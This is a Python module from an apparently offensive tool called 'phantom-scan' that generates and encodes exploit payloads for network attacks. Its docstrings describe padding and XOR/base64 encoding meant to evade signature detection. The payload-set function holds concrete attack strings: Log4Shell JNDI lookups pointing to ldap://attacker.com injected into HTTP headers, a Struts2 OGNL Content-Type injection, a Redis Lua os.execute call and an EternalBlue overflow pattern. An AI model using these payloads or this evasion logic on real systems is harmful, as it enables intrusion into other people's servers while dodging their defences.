"""
phantom-scan — Payload Engine
=================================
Generates and encodes exploit payloads for network exploitation.
Supports multiple encoding schemes to evade simple detection mechanisms.

Payload types supported:
- RCE payloads (shellcode, command execution)
- Buffer overflow patterns
- Protocol-specific injections
- Encoded/obfuscated variants

No AI — all payload generation is based on deterministic encoding
and known exploit patterns.
"""

import base64
import random
import string
import logging
from typing import Optional, Dict, List
from dataclasses import dataclass, field

logger = logging.getLogger("phantom-scan")


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""

    encoding: str = "base64"  # base64, hex, xor, random
    encoding_key: Optional[str] = None
    nopsled_size: int = 0
    append_random_padding: bool = True
    max_padding_size: int = 16
    platform: str = "linux"  # linux, windows, generic


@dataclass
class GeneratedPayload:
    """Represents a generated payload."""

    original: bytes
    encoded: bytes
    encoding: str
    size: int
    platform: str
    metadata: Dict = field(default_factory=dict)

    def decode(self) -> bytes:
        """Decode the payload back to original."""
        if self.encoding == "base64":
            return base64.b64decode(self.encoded)
        elif self.encoding == "hex":
            return bytes.fromhex(self.encoded.decode())
        elif self.encoding == "xor":
            key = self.metadata.get("encoding_key", "phantom")
            return self._xor_decode(self.encoded, key)
        return self.encoded

    @staticmethod
    def _xor_decode(data: bytes, key: str = "phantom") -> bytes:
        """XOR decode data with key."""
        key_bytes = key.encode("utf-8")
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

    def to_dict(self) -> dict:
        return {
            "size": self.size,
            "encoding": self.encoding,
            "platform": self.platform,
            "encoded_hex": self.encoded.hex(),
            "metadata": self.metadata,
        }


class PayloadEngine:
    """
    Generates exploit payloads with encoding and evasion capabilities.

    Payload generation process:
    1. Create original payload based on exploit type
    2. Apply encoding scheme (base64, hex, XOR)
    3. Add NOP sled if requested
    4. Append random padding to defeat signature detection
    5. Return encoded payload ready for delivery
    """

    def __init__(self, config: Optional[PayloadConfig] = None):
        self.config = config or PayloadConfig()

    def generate_rce_payload(self, command: str) -> GeneratedPayload:
        """
        Generate a remote code execution payload.

        Args:
            command: The command to execute on target

        Returns:
            GeneratedPayload with encoded command
        """
        # Convert command to bytes
        original = command.encode("utf-8")

        # Generate encoded payload
        encoded = self._encode(original)

        # Add random padding if configured
        if self.config.append_random_padding:
            padding = self._generate_padding()
            encoded = encoded + padding

        return GeneratedPayload(
            original=original,
            encoded=encoded,
            encoding=self.config.encoding,
            size=len(encoded),
            platform=self.config.platform,
            metadata={"command": command, "type": "rce", "encoding_key": self.config.encoding_key},
        )

    def generate_overflow_pattern(self, size: int) -> GeneratedPayload:
        """
        Generate a buffer overflow pattern of specified size.

        Uses a deterministic pattern that can be used to find
        offset values for stack-based overflows.

        Args:
            size: Size of overflow pattern in bytes

        Returns:
            GeneratedPayload with overflow pattern
        """
        # Generate cyclic pattern (Metasploit-style)
        pattern = self._generate_cyclic_pattern(size)
        original = pattern
        encoded = self._encode(pattern)

        return GeneratedPayload(
            original=original,
            encoded=encoded,
            encoding=self.config.encoding,
            size=len(encoded),
            platform=self.config.platform,
            metadata={"type": "overflow", "pattern_size": size},
        )

    def generate_injection_payload(self, target_header: str, injection: str) -> GeneratedPayload:
        """
        Generate a protocol injection payload.

        Args:
            target_header: The header name to inject into
            injection: The injection content

        Returns:
            GeneratedPayload with injection payload
        """
        original = f"{target_header}: {injection}\r\n".encode("utf-8")
        encoded = self._encode(original)

        if self.config.append_random_padding:
            padding = self._generate_padding()
            encoded = encoded + padding

        return GeneratedPayload(
            original=original,
            encoded=encoded,
            encoding=self.config.encoding,
            size=len(encoded),
            platform=self.config.platform,
            metadata={"header": target_header, "type": "injection"},
        )

    def generate_nopsled(self, size: int) -> bytes:
        """Generate a NOP sled of specified size."""
        return b"\x90" * size

    def _encode(self, data: bytes) -> bytes:
        """Encode data based on configuration."""
        encoding = self.config.encoding.lower()

        if encoding == "base64":
            return base64.b64encode(data)
        elif encoding == "hex":
            return data.hex().encode("utf-8")
        elif encoding == "xor":
            key = self.config.encoding_key or "phantom"
            return self._xor_encode(data, key)
        else:
            # Default to raw bytes
            return data

    def _xor_encode(self, data: bytes, key: str) -> bytes:
        """XOR encode data with a repeating key."""
        key_bytes = key.encode("utf-8")
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

    def _generate_padding(self) -> bytes:
        """Generate random padding bytes to evade signature detection."""
        size = random.randint(0, self.config.max_padding_size)
        return bytes(random.randint(0, 255) for _ in range(size))

    def _generate_cyclic_pattern(self, size: int) -> bytes:
        """Generate a Metasploit-style cyclic pattern."""
        pattern = bytearray()
        chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
        for i in range(size):
            pattern.append(ord(chars[i % len(chars)]))
        return bytes(pattern)

    def generate_payload_set(self, exploit: dict) -> List[GeneratedPayload]:
        """
        Generate a set of payloads for a specific exploit.

        Args:
            exploit: Exploit entry dictionary with type and parameters

        Returns:
            List of generated payloads for different delivery methods
        """
        payloads = []
        exploit_type = exploit.get("payload_type", "rce")

        if exploit_type == "rce_jndi":
            # JNDI injection payload for Log4Shell
            payload = self.generate_injection_payload("User-Agent", "${jndi:ldap://attacker.com/a}")
            payloads.append(payload)

            # Alternative with different header
            payload2 = self.generate_injection_payload(
                "X-Api-Version", "${jndi:ldap://attacker.com/b}"
            )
            payloads.append(payload2)

        elif exploit_type == "rce_ognl":
            # OGNL payload for Struts2
            ognl_payload = (
                "%{(#_='multipart/form-data')."
                "(#dm=@ognl.OgnlContext@defaultMemberAccess)."
                "(#context.setMemberAccess(#dm))}"
            )
            payload = self.generate_injection_payload("Content-Type", ognl_payload)
            payloads.append(payload)

        elif exploit_type == "rce_eternalblue":
            # SMB EternalBlue exploit payload structure
            overflow = self.generate_overflow_pattern(4096)
            payloads.append(overflow)

        elif exploit_type == "rce_lua":
            # Redis Lua sandbox escape
            lua_payload = 'redis.call("EVAL", "return os.execute(\\"id\\")", 0)'
            payload = self.generate_injection_payload("EVAL", lua_payload)
            payloads.append(payload)

        else:
            # Generic RCE payload
            payload = self.generate_rce_payload("whoami")
            payloads.append(payload)

        logger.info(f"[PAYLOAD] Generated {len(payloads)} payloads for {exploit_type}")
        return payloads
